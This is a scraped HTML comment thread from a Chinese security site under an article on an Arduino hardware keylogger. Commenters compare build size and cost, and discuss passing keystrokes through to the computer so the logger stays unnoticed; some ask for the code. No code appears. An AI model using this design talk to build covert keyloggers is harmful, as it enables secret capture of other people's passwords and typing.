		<span class="time">&nbsp;2015-02-15</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-64637','64637', 'respond','59045' ) " href="?replytocom=64637#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor"></span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>@ 戈壁王大妈  哪里不懂了，这不是很正常的思维么..</p>
<div class="comment-tools">
<div class="vote" id="vote-64637"><span id="acv_stat_64637"></span><a class="ilike_icon"  id="vote4-64637" href="javascript:acv_vote(64637,1);">亮了</a>(<span id="cos_support-64637">0</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="64637" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="64637" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="64637" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="64637" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="64637" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
<li class="comment byuser comment-author-anymous even thread-odd thread-alt depth-1" id="li-comment-64639">
    <div id="comment-64639">
        <div class="photo"> <a href="http://www.freebuf.com/author/anymous">
    <img src="http://image.3001.net/2015/02/2015011616054137174.png"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/anymous" target="_blank">anymous&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(3级)</span>
				<span class="explain"> 专注于廉价迷你方便快捷的解决方案ด้้้้้็็็็็้้้... </span>
		<span class="time">&nbsp;2015-02-15</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-64639','64639', 'respond','59045' ) " href="?replytocom=64639#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">4楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>我怎么感觉就比我这个http://www.freebuf.com/geek/58895.html<br />
强在能多记录几个组合键而已，<br />
键盘记录时组合键用处不大吧。<br />
而且这装置庞大的身躯也是醉了<br />
我的那个可以加micro 加sd卡模块才母猪大小，再加mini gsm也没这个大啊</p>
<div class="comment-tools">
<div class="vote" id="vote-64639"><span id="acv_stat_64639"></span><a class="ilike_icon"  id="vote4-64639" href="javascript:acv_vote(64639,1);">亮了</a>(<span id="cos_support-64639">0</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="64639" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="64639" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="64639" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="64639" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="64639" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
<ul class="children">
<li class="comment byuser comment-author-b41k3r odd alt depth-2" id="li-comment-64643">
    <div id="comment-64643">
        <div class="photo"> <a href="http://www.freebuf.com/author/b41k3r">
    <img src="http://www.freebuf.com/buf/plugins/wp-user-avatar/images/wp-user-avatar-96x96.png"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/b41k3r" target="_blank">b41k3r&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(2级)</span>
				<span class="explain">  </span>
		<span class="time">&nbsp;2015-02-15</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-64643','64643', 'respond','59045' ) " href="?replytocom=64643#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor"></span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>@ anymous    @ anymous    这位兄台也是同好啊，这篇东西是我去年写的，不是我不在乎体积，是当时手头实在没有小板子(本人地处偏远，买电子产品极其不方便),其实本意是要用teensy来做的，teensy的体积和你这篇文章里面的差不多，不得已用了arduino，后来有了小板我也懒得改了，程序稍加改动是可以用于小板子的.<br />
另外组合键我觉得不但不多余，而且远远不够，因为组合键实现的少，做坏事的时候会很容易被发现的。。。 <img src='http://image.3001.net/images/index/smilies/icon_lol.gif' alt=':lol:' class='wp-smiley' />  ,最好是把能想到的组合键都实现了。。嘿嘿。</p>
<div class="comment-tools">
<div class="vote" id="vote-64643"><span id="acv_stat_64643"></span><a class="ilike_icon"  id="vote4-64643" href="javascript:acv_vote(64643,1);">亮了</a>(<span id="cos_support-64643">1</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="64643" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="64643" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="64643" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="64643" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="64643" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
<ul class="children">
<li class="comment byuser comment-author-anymous even depth-3" id="li-comment-64651">
    <div id="comment-64651">
        <div class="photo"> <a href="http://www.freebuf.com/author/anymous">
    <img src="http://image.3001.net/2015/02/2015011616054137174.png"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/anymous" target="_blank">anymous&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(3级)</span>
				<span class="explain"> 专注于廉价迷你方便快捷的解决方案ด้้้้้็็็็็้้้... </span>
		<span class="time">&nbsp;2015-02-15</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		           <a onclick="return addComment.moveForm( 'comment-64651','64643', 'respond','59045' )" href="?replytocom=64651#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor"></span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>@ b41k3r    我读过你的文章，我其实不赞成用teensy，它的价格实在是比arduino高好多。“本人地处偏远，买电子产品极其不方便”，这个我也一样，手头没有现成很蛋疼，同感。。我现在手头就是缺micro sd卡模块等。之前我和你的思路是一样的，但后来我的思路改变了。我的思路是将键盘的信息同时发送到arduino和计算机上，这样即使组合键识别不出来也不会影响键盘输入，所以不涉及因为组合键实现的少，做坏事的时候会很容易被发现的，而识别组合键可以慢慢完善。而现实记录当中，固然有记录组合键功能是好，但如果没有影响也不大吧。毕竟记录的也主要是输入的内容。<br />
头像是随便百度来的，话说一张图片涉及版权吗？本人不知啊</p>
<div class="comment-tools">
<div class="vote" id="vote-64651"><span id="acv_stat_64651"></span><a class="ilike_icon"  id="vote4-64651" href="javascript:acv_vote(64651,1);">亮了</a>(<span id="cos_support-64651">0</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="64651" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="64651" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="64651" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="64651" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="64651" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment odd alt depth-3" id="li-comment-113614">
    <div id="comment-113614">
        <div class="photo">     <img src="http://image.3001.net/images/headimg/pic12.png">     </div>
    <div class="tit"> 
	    <span class="name"> acer001 </span>
        		<span class="explain">  </span>
		<span class="time">&nbsp;2015-07-25</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		           <a onclick="return addComment.moveForm( 'comment-113614','64643', 'respond','59045' )" href="?replytocom=113614#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor"></span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>@ anymous    可以留个联系方式交流下你那个蓝牙传输的技术吗</p>
<div class="comment-tools">
<div class="vote" id="vote-113614"><span id="acv_stat_113614"></span><a class="ilike_icon"  id="vote4-113614" href="javascript:acv_vote(113614,1);">亮了</a>(<span id="cos_support-113614">0</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="113614" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="113614" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="113614" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="113614" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="113614" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment byuser comment-author-anymous even depth-3" id="li-comment-117525">
    <div id="comment-117525">
        <div class="photo"> <a href="http://www.freebuf.com/author/anymous">
    <img src="http://image.3001.net/2015/02/2015011616054137174.png"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/anymous" target="_blank">anymous&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(3级)</span>
				<span class="explain"> 专注于廉价迷你方便快捷的解决方案ด้้้้้็็็็็้้้... </span>
		<span class="time">&nbsp;2015-08-10</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		           <a onclick="return addComment.moveForm( 'comment-117525','64643', 'respond','59045' )" href="?replytocom=117525#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor"></span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>@ acer001  私信。</p>
<div class="comment-tools">
<div class="vote" id="vote-117525"><span id="acv_stat_117525"></span><a class="ilike_icon"  id="vote4-117525" href="javascript:acv_vote(117525,1);">亮了</a>(<span id="cos_support-117525">0</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="117525" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="117525" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="117525" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="117525" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="117525" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
<li class="comment byuser comment-author-b41k3r odd alt depth-2" id="li-comment-64645">
    <div id="comment-64645">
        <div class="photo"> <a href="http://www.freebuf.com/author/b41k3r">
    <img src="http://www.freebuf.com/buf/plugins/wp-user-avatar/images/wp-user-avatar-96x96.png"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/b41k3r" target="_blank">b41k3r&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(2级)</span>
				<span class="explain">  </span>
		<span class="time">&nbsp;2015-02-15</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-64645','64645', 'respond','59045' ) " href="?replytocom=64645#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor"></span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>@ anymous    顺便说一下，乃的头像和乃用在那篇文章里面的ps2接口示意图，出处就是我这篇文章，图片可是我自己用ps画滴，版权费拿来&#8230; <img src='http://image.3001.net/images/index/smilies/icon_twisted.gif' alt=':twisted:' class='wp-smiley' />   <img src='http://image.3001.net/images/index/smilies/icon_twisted.gif' alt=':twisted:' class='wp-smiley' /> </p>
<div class="comment-tools">
<div class="vote" id="vote-64645"><span id="acv_stat_64645"></span><a class="ilike_icon"  id="vote4-64645" href="javascript:acv_vote(64645,1);">亮了</a>(<span id="cos_support-64645">3</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="64645" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="64645" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="64645" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="64645" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="64645" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
<ul class="children">
<li class="comment byuser comment-author-banish bypostauthor even depth-3" id="li-comment-64647">
    <div id="comment-64647">
        <div class="photo"> <a href="http://www.freebuf.com/author/banish">
    <img src="http://image.3001.net/2016/02/img-deb2308e581acc70843c632c719a2b47_1.jpg"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/banish" target="_blank">banish&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(6级)</span>
				<span class="explain"> 天地不仁 万物刍狗 </span>
		<span class="time">&nbsp;2015-02-15</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		           <a onclick="return addComment.moveForm( 'comment-64647','64645', 'respond','59045' )" href="?replytocom=64647#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor"></span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>@ b41k3r    毕思瑶男神~~~</p>
<div class="comment-tools">
<div class="vote" id="vote-64647"><span id="acv_stat_64647"></span><a class="ilike_icon"  id="vote4-64647" href="javascript:acv_vote(64647,1);">亮了</a>(<span id="cos_support-64647">1</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="64647" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="64647" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="64647" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="64647" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="64647" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
<li class="comment odd alt thread-even depth-1" id="li-comment-70601">
    <div id="comment-70601">
        <div class="photo">     <img src="http://image.3001.net/images/headimg/pic16.png">     </div>
    <div class="tit"> 
	    <span class="name"> 郑明昊丶干巴爹<span class="weibo"></span> </span>
        		<span class="explain">  </span>
		<span class="time">&nbsp;2015-02-16</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-70601','70601', 'respond','59045' ) " href="?replytocom=70601#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">5楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>首先他不是个木马，其次就不会被查到。</p>
<div class="comment-tools">
<div class="vote" id="vote-70601"><span id="acv_stat_70601"></span><a class="ilike_icon"  id="vote4-70601" href="javascript:acv_vote(70601,1);">亮了</a>(<span id="cos_support-70601">0</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="70601" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="70601" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="70601" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="70601" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="70601" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment even thread-odd thread-alt depth-1" id="li-comment-70600">
    <div id="comment-70600">
        <div class="photo">     <img src="http://image.3001.net/images/headimg/pic17.png">     </div>
    <div class="tit"> 
	    <span class="name"> 严肃的一小峰<span class="weibo"></span> </span>
        		<span class="explain">  </span>
		<span class="time">&nbsp;2015-02-17</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-70600','70600', 'respond','59045' ) " href="?replytocom=70600#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">6楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>是个电影？</p>
<div class="comment-tools">
<div class="vote" id="vote-70600"><span id="acv_stat_70600"></span><a class="ilike_icon"  id="vote4-70600" href="javascript:acv_vote(70600,1);">亮了</a>(<span id="cos_support-70600">0</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="70600" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="70600" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="70600" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="70600" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="70600" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment odd alt thread-even depth-1" id="li-comment-70598">
    <div id="comment-70598">
        <div class="photo">     <img src="http://image.3001.net/images/headimg/pic3.png">     </div>
    <div class="tit"> 
	    <span class="name"> 大呀么大大王<span class="weibo"></span> </span>
        		<span class="explain">  </span>
		<span class="time">&nbsp;2015-02-17</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-70598','70598', 'respond','59045' ) " href="?replytocom=70598#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">7楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>已预订<img src="http://img.t.sinajs.cn/t35/style/images/common/face/ext/normal/6d/yx_org.gif" title="阴险" /><img src="http://img.t.sinajs.cn/t35/style/images/common/face/ext/normal/6d/yx_org.gif" title="阴险" /><img data-original="http://img.t.sinajs.cn/t35/style/images/common/face/ext/normal/6d/yx_org.gif" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" title="阴险" /></p>
<noscript><img src="http://img.t.sinajs.cn/t35/style/images/common/face/ext/normal/6d/yx_org.gif" title="阴险" /><img src="http://img.t.sinajs.cn/t35/style/images/common/face/ext/normal/6d/yx_org.gif" title="阴险" /><img src="http://img.t.sinajs.cn/t35/style/images/common/face/ext/normal/6d/yx_org.gif" title="阴险" /></noscript>
<div class="comment-tools">
<div class="vote" id="vote-70598"><span id="acv_stat_70598"></span><a class="ilike_icon"  id="vote4-70598" href="javascript:acv_vote(70598,1);">亮了</a>(<span id="cos_support-70598">0</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="70598" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="70598" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="70598" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="70598" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="70598" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment even thread-odd thread-alt depth-1" id="li-comment-70599">
    <div id="comment-70599">
        <div class="photo">     <img src="http://image.3001.net/images/headimg/pic8.png">     </div>
    <div class="tit"> 
	    <span class="name"> 我不是张同学<span class="weibo"></span> </span>
        		<span class="explain">  </span>
		<span class="time">&nbsp;2015-02-17</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-70599','70599', 'respond','59045' ) " href="?replytocom=70599#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">8楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>不是啊，情节是编的，技术部分是真的啦</p>
<div class="comment-tools">
<div class="vote" id="vote-70599"><span id="acv_stat_70599"></span><a class="ilike_icon"  id="vote4-70599" href="javascript:acv_vote(70599,1);">亮了</a>(<span id="cos_support-70599">0</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="70599" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="70599" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="70599" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="70599" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="70599" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment byuser comment-author-ubuntu odd alt thread-even depth-1" id="li-comment-65160">
    <div id="comment-65160">
        <div class="photo"> <a href="http://www.freebuf.com/author/ubuntu">
    <img src="http://image.3001.net/2014/10/dao.jpg"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/ubuntu" target="_blank">ubuntu&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(2级)</span>
				<span class="explain">  </span>
		<span class="time">&nbsp;2015-02-28</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-65160','65160', 'respond','59045' ) " href="?replytocom=65160#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">9楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>@ 脑残粉  突然被绰中了笑点。</p>
<div class="comment-tools">
<div class="vote" id="vote-65160"><span id="acv_stat_65160"></span><a class="ilike_icon"  id="vote4-65160" href="javascript:acv_vote(65160,1);">亮了</a>(<span id="cos_support-65160">0</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="65160" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="65160" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="65160" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="65160" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="65160" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment byuser comment-author-ybbbbb even thread-odd thread-alt depth-1" id="li-comment-213270">
    <div id="comment-213270">
        <div class="photo"> <a href="http://www.freebuf.com/author/ybbbbb">
    <img src="http://www.freebuf.com/buf/plugins/wp-user-avatar/images/wp-user-avatar-96x96.png"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/ybbbbb" target="_blank">ybbbbb&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(1级)</span>
				<span class="explain">  </span>
		<span class="time">&nbsp;2017-03-25</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-213270','213270', 'respond','59045' ) " href="?replytocom=213270#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">10楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>前辈，能不能将anduino键盘记录器的程序发一份出来学习一下，原帖格式太乱了。</p>
<div class="comment-tools">
<div class="vote" id="vote-213270"><span id="acv_stat_213270"></span><a class="ilike_icon"  id="vote4-213270" href="javascript:acv_vote(213270,1);">亮了</a>(<span id="cos_support-213270">0</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="213270" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="213270" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="213270" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="213270" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="213270" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
      </ul>
      <div class="commentnav page01" style="padding-top:10px; text-align: center;">
               </div>
	  
<script src="http://www.freebuf.com/buf/themes/freebuf/js/ajaxfileupload.js" type="text/javascript"></script>
<div id="respond" class="comment-box">
<input type="file" id="uploadUnit" name="upfile" class="hidden" value="">
    <form action="http://www.freebuf.com/wp-comments-post.php" method="post" id="commentform">
        <div id="comment-author-info">
	    <div class="login-other">
		  <div class="login_button login_icon_sina" title="使用新浪微博登陆" onclick="login_button_click('sina')"></div>
          <div class="login_button login_icon_qq" title="使用腾讯QQ登陆" onclick="login_button_click('qq')"></div></div>
        <div class="login-input">
	    <p><label for="author">昵称</label>
		          <input type="text" name="author" id="author" value="" size="14" tabindex="1" aria-required='true' placeholder = "请输入昵称" required />
        </p><span>必须</span><span>您当前尚未登录。<a  class="simplemodal-login" href="http://www.freebuf.com/oauth" title="登陆">登陆？</a><a  href="https://account.tophant.com/register.html" target="_blank">注册</a></span></div>
		<div class="login-input">
		  <p><label for="email">邮箱</label><input type="text" name="email" id="email" value="" size="25" tabindex="2" aria-required='true' placeholder = "请输入邮箱地址" required /></p>
		<span>必须（保密）</span>
		</div>
    </div>

        <div id="test" class="post-area">
      <div class="holiday"></div>
	    <div class="comment-editor">
			<a id="comment-smiley" href="javascript:;">表情</a><a href="javascript:;" id="imageThumb">插图</a>
	    </div>
        <div id="smileys" >
           <a title="mrgreen" href="javascript:grin(':mrgreen:')"><img src="http://image.3001.net/images/index/smilies/icon_mrgreen.gif" /></a><a title="razz" href="javascript:grin(':razz:')"><img src="http://image.3001.net/images/index/smilies/icon_razz.gif" /></a><a title="sad" href="javascript:grin(':sad:')"><img src="http://image.3001.net/images/index/smilies/icon_sad.gif" /></a><a title="smile" href="javascript:grin(':smile:')"><img src="http://image.3001.net/images/index/smilies/icon_smile.gif" /></a><a title="oops" href="javascript:grin(':oops:')"><img src="http://image.3001.net/images/index/smilies/icon_redface.gif" /></a><a title="grin" href="javascript:grin(':grin:')"><img src="http://image.3001.net/images/index/smilies/icon_biggrin.gif" /></a><a title="eek" href="javascript:grin(':eek:')"><img src="http://image.3001.net/images/index/smilies/icon_surprised.gif" /></a><a title="???" href="javascript:grin(':???:')"><img src="http://image.3001.net/images/index/smilies/icon_confused.gif" /></a><a title="cool" href="javascript:grin(':cool:')"><img src="http://image.3001.net/images/index/smilies/icon_cool.gif" /></a><a title="lol" href="javascript:grin(':lol:')"><img src="http://image.3001.net/images/index/smilies/icon_lol.gif" /></a><a title="mad" href="javascript:grin(':mad:')"><img src="http://image.3001.net/images/index/smilies/icon_mad.gif" /></a><a title="twisted" href="javascript:grin(':twisted:')"><img 